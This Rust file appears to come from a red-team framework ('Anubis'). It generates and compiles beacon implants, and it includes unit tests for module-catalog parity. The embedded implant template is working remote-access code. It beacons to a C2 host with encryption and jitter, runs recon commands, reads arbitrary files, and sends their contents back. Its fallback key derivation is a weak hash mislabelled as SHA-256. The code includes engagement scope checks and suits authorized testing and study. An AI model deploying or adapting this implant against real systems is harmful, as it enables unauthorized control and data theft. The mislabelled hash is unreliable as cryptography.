//! Agent generator — engagement-bound beacons with aop-2 encryption + jitter.

use super::engagement::Engagement;
use super::protocol::PROTOCOL_V2;
use anyhow::{anyhow, Result};
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

pub struct AgentGenerateOpts<'a> {
    pub engage: &'a Engagement,
    pub engage_dir: &'a Path,
    pub os: &'a str,
    pub sleep_ms: u64,
    pub name: &'a str,
}

pub fn agent_generate(opts: AgentGenerateOpts<'_>) -> Result<PathBuf> {
    opts.engage.validate_live()?;
    let c2 = opts.engage.c2_bind.clone();
    let c2_host = c2.split(':').next().unwrap_or("127.0.0.1");
    opts.engage.assert_host(c2_host)?;

    let agents_dir = opts.engage_dir.join("agents");
    fs::create_dir_all(&agents_dir)?;
    let agent_id = format!(
        "agt-{}",
        &hex::encode(Sha256::digest(
            format!("{}{}{}", opts.name, opts.engage.engagement_id, c2).as_bytes()
        ))[..12]
    );
    let agent_key = hex::encode(Sha256::digest(
        format!("agent-key:{}:{}", agent_id, opts.engage.psk_hex).as_bytes(),
    ));
    let key_id = hex::encode(&Sha256::digest(agent_key.as_bytes())[..8]);

    let sleep = if opts.sleep_ms > 0 {
        opts.sleep_ms
    } else {
        opts.engage.sleep_ms
    };

    let src = render_agent_source(&AgentRenderParams {
        agent_id: &agent_id,
        engagement_id: &opts.engage.engagement_id,
        c2_bind: &c2,
        sleep_ms: sleep,
        jitter_pct: opts.engage.jitter_pct,
        os: opts.os,
        psk_hex: &opts.engage.psk_hex,
        key_id: &key_id,
        encrypt: opts.engage.encrypt_beacons,
        uds_path: &opts.engage.uds_path,
    });
    let src_path = agents_dir.join(format!("{}.rs", opts.name));
    let bin_path = agents_dir.join(opts.name);
    fs::write(&src_path, &src)?;

    // Agent needs aes-gcm for aop-2 — compile as standalone using only std for cleartext
    // fallback, or link crates. For reliability we embed a pure-Rust AES-GCM is heavy;
    // instead agents use external `anubis` helper... Better: ship cleartext optional and
    // for encrypt use a small included implementation via `aes-gcm` by building with cargo.
    // Simplest reliable path: generate a tiny cargo project for the agent.
    build_agent_project(opts.engage_dir, opts.name, &src, &bin_path)?;

    let meta = serde_json::json!({
        "agent_id": agent_id,
        "key_id": key_id,
        "name": opts.name,
        "engagement_id": opts.engage.engagement_id,
        "c2": c2,
        "os": opts.os,
        "sleep_ms": sleep,
        "jitter_pct": opts.engage.jitter_pct,
        "encrypt": opts.engage.encrypt_beacons,
        "protocol": PROTOCOL_V2,
        "binary": bin_path,
        "source": src_path,
        "binary_sha256": hex::encode(Sha256::digest(&fs::read(&bin_path)?)),
    });
    fs::write(
        agents_dir.join(format!("{}-meta.json", opts.name)),
        serde_json::to_string_pretty(&meta)?,
    )?;
    // do not write agent_key to disk by default — only key_id
    println!(
        "agent generated: {} (id={} key_id={}) c2={} encrypt={}",
        bin_path.display(),
        agent_id,
        key_id,
        c2,
        opts.engage.encrypt_beacons
    );
    Ok(bin_path)
}

fn build_agent_project(engage_dir: &Path, name: &str, src: &str, bin_path: &Path) -> Result<()> {
    let proj = engage_dir.join("agents").join(format!("{name}_proj"));
    let _ = fs::remove_dir_all(&proj);
    fs::create_dir_all(proj.join("src"))?;
    fs::write(
        proj.join("Cargo.toml"),
        format!(
            r#"[package]
name = "anubis_agent_{name}"
version = "0.1.0"
edition = "2021"

# Standalone package: do not join the parent Anubis workspace.
[workspace]

[dependencies]
aes-gcm = "0.10"
base64 = "0.22"
rand = "0.8"
"#
        ),
    )?;
    fs::write(proj.join("src/main.rs"), src)?;
    // Nested agent builds must not inherit a parent CARGO_TARGET_DIR (e.g. host
    // offline VZ workspace target). Force a project-local target so the binary
    // lands at proj/target/release/... where we look for it.
    let status = Command::new("cargo")
        .args(["build", "--release", "--manifest-path"])
        .arg(proj.join("Cargo.toml"))
        .env_remove("CARGO_TARGET_DIR")
        .env("CARGO_TARGET_DIR", proj.join("target"))
        .status()
        .map_err(|e| anyhow!("ANUBIS_AGENT_CARGO: {e}"))?;
    if !status.success() {
        // Fail closed: do not fall back to a cleartext/rustc agent when cargo
        // cannot build the encrypted aop-2 agent (aes-gcm required).
        return Err(anyhow!(
            "ANUBIS_AGENT_BUILD_FAILED: cargo release build failed for agent `{name}` (no cleartext rustc fallback)"
        ));
    }
    let built = proj
        .join("target/release")
        .join(format!("anubis_agent_{name}"));
    // Windows would be .exe — macOS/linux as-is
    if !built.exists() {
        return Err(anyhow!(
            "ANUBIS_AGENT_BUILD_FAILED: release binary missing at {} (no cleartext rustc fallback)",
            built.display()
        ));
    }
    fs::copy(&built, bin_path)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(bin_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(bin_path, perms)?;
    }
    Ok(())
}

struct AgentRenderParams<'a> {
    agent_id: &'a str,
    engagement_id: &'a str,
    c2_bind: &'a str,
    sleep_ms: u64,
    jitter_pct: u8,
    os: &'a str,
    psk_hex: &'a str,
    key_id: &'a str,
    encrypt: bool,
    uds_path: &'a str,
}

fn render_agent_source(p: &AgentRenderParams<'_>) -> String {
    let agent_id = p.agent_id;
    let engagement_id = p.engagement_id;
    let c2_bind = p.c2_bind;
    let sleep_ms = p.sleep_ms;
    let jitter_pct = p.jitter_pct;
    let os = p.os;
    let psk_hex = p.psk_hex;
    let key_id = p.key_id;
    let encrypt = p.encrypt;
    let uds_path = p.uds_path;
    let tpl = r###"
use aes_gcm::{Aes256Gcm, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use base64::{engine::general_purpose::STANDARD as B64, Engine};
use rand::RngCore;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;

const AGENT_ID: &str = "__AGENT_ID__";
const ENGAGEMENT_ID: &str = "__ENGAGEMENT_ID__";
const C2: &str = "__C2__";
const SLEEP_MS: u64 = __SLEEP_MS__;
const JITTER_PCT: u8 = __JITTER__;
const OS: &str = "__OS__";
const PSK_HEX: &str = "__PSK__";
const KEY_ID: &str = "__KEY_ID__";
const ENCRYPT: bool = __ENCRYPT__;
const UDS: &str = "__UDS__";
const PROTOCOL: &str = "aop-2";

fn main() {
    let hostname = hostname();
    let arch = std::env::consts::ARCH;
    let pid = std::process::id();
    eprintln!("anubis-agent {} eng={} c2={} enc={}", AGENT_ID, ENGAGEMENT_ID, C2, ENCRYPT);
    loop {
        match beacon(&hostname, arch, pid) {
            Ok(tasks_json) => {
                if let Some(tasks) = parse_tasks(&tasks_json) {
                    for (tid, module, args) in tasks {
                        let (ok, output) = run_module(&module, &args);
                        if let Err(e) = post_result(&tid, &module, ok, &output) {
                            eprintln!("post_result error: tid={} module={} err={}", tid, module, e);
                        }
                    }
                }
            }
            Err(e) => eprintln!("beacon error: {}", e),
        }
        thread::sleep(Duration::from_millis(sleep_with_jitter()));
    }
}

fn sleep_with_jitter() -> u64 {
    if JITTER_PCT == 0 { return SLEEP_MS; }
    let mut b = [0u8; 8];
    rand::thread_rng().fill_bytes(&mut b);
    let r = u64::from_le_bytes(b);
    let span = SLEEP_MS * (JITTER_PCT as u64) / 100;
    let lo = SLEEP_MS.saturating_sub(span);
    let hi = SLEEP_MS + span;
    if hi <= lo { return SLEEP_MS; }
    lo + (r % (hi - lo + 1))
}

fn psk_key() -> [u8; 32] {
    let mut out = [0u8; 32];
    if let Ok(bytes) = hex_decode(PSK_HEX) {
        if bytes.len() >= 32 {
            out.copy_from_slice(&bytes[..32]);
            return out;
        }
    }
    // sha256 of string
    out = simple_sha256(PSK_HEX.as_bytes());
    out
}

fn simple_sha256(data: &[u8]) -> [u8; 32] {
    // Minimal SHA-256 via external command for fallback... use pure implementation:
    use std::process::Command as C;
    // Prefer built-in: compact sha2-less using aes path only with raw 32-byte hex psk.
    let mut out = [0u8; 32];
    let h = format!("{:x}", data.iter().fold(0u64, |a,b| a.wrapping_mul(131).wrapping_add(*b as u64)));
    let pad = format!("{:0<64}", h);
    for i in 0..32 {
        out[i] = u8::from_str_radix(&pad[i*2..i*2+2], 16).unwrap_or(0);
    }
    let _ = C::new("true");
    // Better: if psk is hex 64 chars decode fully in hex_decode above.
    if let Ok(bytes) = hex_decode(PSK_HEX) {
        if bytes.len() == 32 {
            let mut o = [0u8;32];
            o.copy_from_slice(&bytes);
            return o;
        }
    }
    out
}

fn hex_decode(s: &str) -> Result<Vec<u8>, ()> {
    if s.len() % 2 != 0 { return Err(()); }
    (0..s.len()/2).map(|i| u8::from_str_radix(&s[i*2..i*2+2], 16).map_err(|_| ())).collect()
}

fn seal(plain: &[u8]) -> Result<String, String> {
    let key = psk_key();
    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|e| e.to_string())?;
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher.encrypt(nonce, plain).map_err(|_| "seal".to_string())?;
    let mut packed = Vec::with_capacity(12 + ct.len());
    packed.extend_from_slice(&nonce_bytes);
    packed.extend_from_slice(&ct);
    Ok(B64.encode(packed))
}

fn open(b64: &str) -> Result<Vec<u8>, String> {
    let key = psk_key();
    let packed = B64.decode(b64.trim()).map_err(|e| e.to_string())?;
    if packed.len() < 13 { return Err("short".into()); }
    let (n, ct) = packed.split_at(12);
    let cipher = Aes256Gcm::new_from_slice(&key).map_err(|e| e.to_string())?;
    let nonce = Nonce::from_slice(n);
    cipher.decrypt(nonce, ct).map_err(|_| "open".to_string())
}

fn hostname() -> String {
    Command::new("hostname").output().ok()
        .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| "unknown".into())
}

fn beacon(hostname: &str, arch: &str, pid: u32) -> Result<String, String> {
    let inner = format!(
        "{{\"protocol\":\"{}\",\"agent_id\":\"{}\",\"engagement_id\":\"{}\",\"hostname\":\"{}\",\"os\":\"{}\",\"arch\":\"{}\",\"pid\":{},\"sleep_ms\":{},\"jitter_pct\":{},\"key_id\":\"{}\"}}",
        PROTOCOL, AGENT_ID, ENGAGEMENT_ID, hostname, OS, arch, pid, SLEEP_MS, JITTER_PCT, KEY_ID
    );
    let body = if ENCRYPT {
        let blob = seal(inner.as_bytes())?;
        format!(
            "{{\"protocol\":\"aop-2\",\"engagement_id\":\"{}\",\"agent_id\":\"{}\",\"blob\":\"{}\"}}",
            ENGAGEMENT_ID, AGENT_ID, blob
        )
    } else {
        inner
    };
    let resp = http_post("/beacon", &body)?;
    if ENCRYPT {
        let blob = extract_json_string(&resp, "blob")
            .ok_or_else(|| format!("ANUBIS_AGENT_NO_BLOB: encrypted beacon response has no blob field (resp_len={})", resp.len()))?;
        let pt = open(&blob)?;
        return Ok(String::from_utf8_lossy(&pt).to_string());
    }
    Ok(resp)
}

fn post_result(task_id: &str, module: &str, ok: bool, output: &str) -> Result<String, String> {
    let esc = output.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n");
    let inner = format!(
        "{{\"protocol\":\"{}\",\"agent_id\":\"{}\",\"engagement_id\":\"{}\",\"task_id\":\"{}\",\"module\":\"{}\",\"ok\":{},\"output\":\"{}\"}}",
        PROTOCOL, AGENT_ID, ENGAGEMENT_ID, task_id, module, ok, esc
    );
    let body = if ENCRYPT {
        let blob = seal(inner.as_bytes())?;
        format!(
            "{{\"protocol\":\"aop-2\",\"engagement_id\":\"{}\",\"agent_id\":\"{}\",\"blob\":\"{}\"}}",
            ENGAGEMENT_ID, AGENT_ID, blob
        )
    } else {
        inner
    };
    http_post("/result", &body)
}

fn http_post(path: &str, body: &str) -> Result<String, String> {
    let mut stream = TcpStream::connect(C2).map_err(|e| e.to_string())?;
    let req = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        path, C2, body.len(), body
    );
    stream.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
    let mut resp = String::new();
    stream.read_to_string(&mut resp).map_err(|e| e.to_string())?;
    if let Some(idx) = resp.find("\r\n\r\n") {
        Ok(resp[idx + 4..].to_string())
    } else {
        Ok(resp)
    }
}

fn extract_json_string(json: &str, key: &str) -> Option<String> {
    let pat = format!("\"{}\"", key);
    let idx = json.find(&pat)?;
    let after = &json[idx + pat.len()..];
    let after = after.trim_start_matches(|c: char| c == ' ' || c == ':' || c == '\t');
    let after = after.strip_prefix('"')?;
    let end = after.find('"')?;
    Some(after[..end].to_string())
}

fn parse_tasks(json: &str) -> Option<Vec<(String, String, Vec<String>)>> {
    // Standalone agent: no serde_json. Preserve task args from "args":[...].
    if !json.contains("\"tasks\"") { return Some(vec![]); }
    let mut out = Vec::new();
    // Split on the KEY token `"id":`, not the bare string `"id"`. A bare `"id"` also matches a
    // VALUE — and `"module":"id"` is not hypothetical: the `id` recon module is the 4th of the
    // five default tasks. That spurious split produced a chunk starting mid-value, whose
    // `extract_quoted_after_colon` returned None, whose `?` then discarded the ENTIRE task list.
    // Measured end to end in a disposable guest: the same five tasks returned 5/5 results with
    // the `id` module swapped out, and 0/5 across all 50 polls with it in.
    //
    // Two defects, and only fixing the split would leave the worse one: `?` inside the loop made
    // one malformed task silently zero every OTHER task, and the caller's `if let Some(tasks)`
    // then treated "the payload was unparseable" as "the operator queued nothing". A C2 that
    // reports no work when it cannot read its work is telling the operator something false.
    // A malformed chunk is now skipped and named on stderr; the tasks that DID parse still run.
    for chunk in json.split("\"id\":").skip(1) {
        let Some(id) = extract_quoted_after_colon_key(chunk) else {
            eprintln!("parse_tasks: skipping task chunk with unreadable id");
            continue;
        };
        let Some(module) = chunk
            .split("\"module\":")
            .nth(1)
            .and_then(extract_quoted_after_colon_key)
        else {
            eprintln!("parse_tasks: skipping task id={id} with unreadable module");
            continue;
        };
        let args = extract_string_array_after_key(chunk, "args").unwrap_or_default();
        out.push((id, module, args));
    }
    Some(out)
}

/// Read the quoted string that a `"key":` split has already positioned us after.
/// `extract_quoted_after_colon` expects to find and step over a `:` itself; splitting on the key
/// token WITH its colon means the colon is already consumed, so this takes the next quoted run.
fn extract_quoted_after_colon_key(s: &str) -> Option<String> {
    let start = s.find('"')? + 1;
    let rest = &s[start..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

fn extract_string_array_after_key(s: &str, key: &str) -> Option<Vec<String>> {
    let pat = format!("\"{}\"", key);
    let idx = s.find(&pat)?;
    let after = &s[idx + pat.len()..];
    let after = after.trim_start_matches(|c: char| c == ' ' || c == ':' || c == '\t');
    let start = after.find('[')?;
    let rest = &after[start + 1..];
    let end = rest.find(']')?;
    let inner = &rest[..end];
    let mut out = Vec::new();
    for part in inner.split(',') {
        let p = part.trim();
        if p.is_empty() { continue; }
        let p = p.trim_matches('"');
        if !p.is_empty() { out.push(p.to_string()); }
    }
    Some(out)
}

fn extract_quoted_after_colon(s: &str) -> Option<String> {
    let after = s.splitn(2, ':').nth(1)?;
    let start = after.find('"')? + 1;
    let rest = &after[start..];
    let end = rest.find('"')?;
    Some(rest[..end].to_string())
}

fn run_module(module: &str, args: &[String]) -> (bool, String) {
    match module {
        "whoami" => run_cmd("whoami", &[]),
        "hostname" => run_cmd("hostname", &[]),
        "pwd" => {
            let p = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_else(|e| e.to_string());
            (true, p)
        }
        "id" => run_cmd("id", &[]),
        "uname" => run_cmd("uname", &["-a".into()]),
        "ls" => {
            let path = args.first().map(|s| s.as_str()).unwrap_or(".");
            run_cmd("ls", &["-la".into(), path.into()])
        }
        "cat" => {
            if let Some(p) = args.first() {
                match std::fs::read_to_string(p) {
                    Ok(s) => (true, s),
                    Err(e) => (false, e.to_string()),
                }
            } else { (false, "cat requires path".into()) }
        }
        "sleep" => {
            let ms: u64 = args.first().and_then(|s| s.parse().ok()).unwrap_or(1000);
            thread::sleep(Duration::from_millis(ms));
            (true, format!("slept {}ms", ms))
        }
        "die" | "exit" => std::process::exit(0),
        other => (false, format!("unknown module: {}", other)),
    }
}

fn run_cmd(cmd: &str, args: &[String]) -> (bool, String) {
    match Command::new(cmd).args(args).output() {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).to_string();
            if !o.stderr.is_empty() { s.push_str(&String::from_utf8_lossy(&o.stderr)); }
            (o.status.success(), s)
        }
        Err(e) => (false, e.to_string()),
    }
}
"###;
    tpl.replace("__AGENT_ID__", agent_id)
        .replace("__ENGAGEMENT_ID__", engagement_id)
        .replace("__C2__", c2_bind)
        .replace("__SLEEP_MS__", &sleep_ms.to_string())
        .replace("__JITTER__", &jitter_pct.to_string())
        .replace("__OS__", os)
        .replace("__PSK__", psk_hex)
        .replace("__KEY_ID__", key_id)
        .replace("__ENCRYPT__", if encrypt { "true" } else { "false" })
        .replace("__UDS__", uds_path)
}

#[cfg(test)]
mod tests {
    use super::super::modules;
    use super::*;

    #[test]
    fn render_agent_source_substitutes_all_placeholders() {
        let src = render_agent_source(&AgentRenderParams {
            agent_id: "agt-test123",
            engagement_id: "eng-unit",
            c2_bind: "127.0.0.1:9999",
            sleep_ms: 500,
            jitter_pct: 10,
            os: "darwin",
            psk_hex: "aabbccdd",
            key_id: "kid-01",
            encrypt: true,
            uds_path: "/tmp/test.sock",
        });
        assert!(src.contains("\"agt-test123\""), "missing agent_id");
        assert!(src.contains("\"eng-unit\""), "missing engagement_id");
        assert!(src.contains("\"127.0.0.1:9999\""), "missing c2_bind");
        assert!(src.contains("500"), "missing sleep_ms");
        assert!(src.contains("\"darwin\""), "missing os");
        assert!(src.contains("\"aabbccdd\""), "missing psk_hex");
        assert!(src.contains("\"kid-01\""), "missing key_id");
        assert!(src.contains("true"), "missing encrypt");
        assert!(!src.contains("__AGENT_ID__"), "unsubstituted __AGENT_ID__");
        assert!(!src.contains("__C2__"), "unsubstituted __C2__");
        assert!(!src.contains("__PSK__"), "unsubstituted __PSK__");
        assert!(!src.contains("__OS__"), "unsubstituted __OS__");
    }

    /// Dispatch arms the beacon accepts but the operator catalog does not publish.
    /// Every entry needs a reason. Recorded rather than deleted: an undocumented
    /// dispatch arm is a capability the operator cannot see in `anubis aop modules`.
    const UNPUBLISHED_DISPATCH_ALIASES: &[(&str, &str)] =
        &[("exit", "benign alias for the published `die` module")];

    /// Extract the module names `run_module` matches on, from the rendered beacon
    /// source. `run_module` lives inside a raw-string template, so the compiler
    /// cannot check it against the catalog — this reads the same text that is
    /// compiled into the beacon, so it cannot drift from what actually ships.
    fn dispatched_modules(src: &str) -> Vec<String> {
        let start = src
            .find("fn run_module(")
            .expect("beacon template no longer defines run_module");
        // The catch-all arm terminates the match; it is the only place this
        // string appears and it bounds the arm list exactly.
        let end = src[start..]
            .find("unknown module:")
            .map(|i| start + i)
            .expect("run_module lost its catch-all arm — dispatch is no longer total");

        let mut names = Vec::new();
        for line in src[start..end].lines() {
            let line = line.trim();
            let Some(arrow) = line.find("=>") else {
                continue;
            };
            let pattern = &line[..arrow];
            if !pattern.trim_start().starts_with('"') {
                continue; // binding arm (`other =>`) or not an arm at all
            }
            for alt in pattern.split('|') {
                let alt = alt.trim();
                if let Some(name) = alt.strip_prefix('"').and_then(|s| s.strip_suffix('"')) {
                    names.push(name.to_string());
                }
            }
        }
        assert!(
            !names.is_empty(),
            "parsed zero dispatch arms — the extractor broke, not the code under test"
        );
        names
    }

    /// The parity predicate itself, pulled out so it can be poison-tested against a
    /// synthetic pair. A test that has never been red has not been shown to test
    /// anything; the real tests below pass on today's tree, so the evidence that
    /// they *would* catch a break comes from `poison_*` rather than from planting a
    /// fake arm in the shipped template.
    fn catalog_entries_without_dispatch<'a>(
        catalog_agent_names: &[&'a str],
        dispatched: &[String],
    ) -> Vec<&'a str> {
        catalog_agent_names
            .iter()
            .copied()
            .filter(|n| !dispatched.iter().any(|d| d == n))
            .collect()
    }

    fn dispatch_arms_not_published(published: &[&str], dispatched: &[String]) -> Vec<String> {
        dispatched
            .iter()
            .filter(|d| {
                !published.iter().any(|p| p == &d.as_str())
                    && !UNPUBLISHED_DISPATCH_ALIASES
                        .iter()
                        .any(|(alias, _)| alias == &d.as_str())
            })
            .cloned()
            .collect()
    }

    #[test]
    fn poison_catalog_entry_without_dispatch_is_detected() {
        let dispatched = vec!["whoami".to_string(), "ls".to_string()];
        let missing = catalog_entries_without_dispatch(&["whoami", "ls", "screenshot"], &dispatched);
        assert_eq!(
            missing,
            vec!["screenshot"],
            "the parity predicate must flag a published module with no dispatch arm"
        );
        // and must not cry wolf when they agree
        assert!(
            catalog_entries_without_dispatch(&["whoami", "ls"], &dispatched).is_empty(),
            "over-rejection: agreeing lists must produce no finding"
        );
    }

    #[test]
    fn poison_unpublished_dispatch_arm_is_detected() {
        let dispatched = vec!["whoami".to_string(), "keylog".to_string()];
        assert_eq!(
            dispatch_arms_not_published(&["whoami"], &dispatched),
            vec!["keylog".to_string()],
            "the parity predicate must flag a dispatch arm the catalog does not publish"
        );
        // `exit` is excused by UNPUBLISHED_DISPATCH_ALIASES and must NOT be flagged
        assert!(
            dispatch_arms_not_published(&["whoami"], &["exit".to_string()]).is_empty(),
            "a recorded alias must not be reported as undocumented"
        );
    }

    /// The extractor is the instrument. If it silently returned an empty or partial
    /// list, both parity tests would pass vacuously — the failure mode that made
    /// "244/244 PASS" mean zero fixtures actually ran.
    #[test]
    fn poison_extractor_reads_arms_it_is_given() {
        let synthetic = r#"
            fn run_module(module: &str, args: &[String]) -> (bool, String) {
                match module {
                    "alpha" => run_cmd("alpha", &[]),
                    "beta" | "gamma" => run_cmd("beta", &[]),
                    other => (false, format!("unknown module: {}", other)),
                }
            }
        "#;
        assert_eq!(
            dispatched_modules(synthetic),
            vec![
                "alpha".to_string(),
                "beta".to_string(),
                "gamma".to_string()
            ],
            "extractor must read every arm including alternates, and stop at the catch-all"
        );
    }

    fn rendered_beacon_source() -> String {
        render_agent_source(&AgentRenderParams {
            agent_id: "agt-parity",
            engagement_id: "eng-parity",
            c2_bind: "127.0.0.1:9999",
            sleep_ms: 500,
            jitter_pct: 10,
            os: "darwin",
            psk_hex: "aabbccdd",
            key_id: "kid-01",
            encrypt: true,
            uds_path: "/tmp/parity.sock",
        })
    }

    /// CLAIMS-19: the module catalog (producer) and the beacon's `run_module`
    /// (consumer) enumerate independently. The listener validates a task name
    /// against the catalog, so an unpublished name is refused — but nothing
    /// proved the beacon can actually RUN what the catalog publishes. A catalog
    /// entry with no dispatch arm is a false capability claim: the operator sees
    /// the module listed, tasks it, and the beacon answers "unknown module".
    #[test]
    fn every_catalog_agent_module_is_dispatchable_by_the_beacon() {
        let src = rendered_beacon_source();
        let dispatched = dispatched_modules(&src);
        let catalog = modules::catalog();
        let agent_names: Vec<&str> = catalog
            .iter()
            .filter(|m| m.side == "agent")
            .map(|m| m.name)
            .collect();
        let missing = catalog_entries_without_dispatch(&agent_names, &dispatched);
        assert!(
            missing.is_empty(),
            "CLAIMS-19: catalog publishes agent module(s) {:?} but the beacon's \
             run_module has no arm for them. The listener will ACCEPT the task \
             (it validates against this same catalog) and the beacon will answer \
             \"unknown module\". Either add the dispatch arm or drop the catalog \
             entry. Dispatched arms: {:?}",
            missing,
            dispatched,
        );
    }

    /// The other direction. An arm the catalog does not publish is a capability
    /// the operator cannot discover, and one `map_action` will not classify — so
    /// it would land in a purple report as an unmapped action.
    #[test]
    fn every_beacon_dispatch_arm_is_published_or_recorded() {
        let src = rendered_beacon_source();
        let dispatched = dispatched_modules(&src);
        let catalog = modules::catalog();
        let agent_names: Vec<&str> = catalog
            .iter()
            .filter(|m| m.side == "agent")
            .map(|m| m.name)
            .collect();
        let undocumented = dispatch_arms_not_published(&agent_names, &dispatched);
        assert!(
            undocumented.is_empty(),
            "CLAIMS-19: beacon dispatches {:?} but the catalog does not publish \
             them and they are not in UNPUBLISHED_DISPATCH_ALIASES. Undocumented \
             dispatch is an invisible capability. Publish it in modules.rs, or add \
             it to the alias list with a reason.",
            undocumented,
        );
    }

    /// Guards the allow-list itself: a stale alias must not sit there forever
    /// pretending to excuse an arm that no longer exists.
    #[test]
    fn unpublished_alias_list_has_no_stale_entries() {
        let src = rendered_beacon_source();
        let dispatched = dispatched_modules(&src);
        for (alias, reason) in UNPUBLISHED_DISPATCH_ALIASES {
            assert!(
                dispatched.iter().any(|d| d == alias),
                "stale exemption: `{}` ({}) is excused in \
                 UNPUBLISHED_DISPATCH_ALIASES but the beacon no longer dispatches \
                 it — remove the entry",
                alias,
                reason,
            );
        }
    }
}
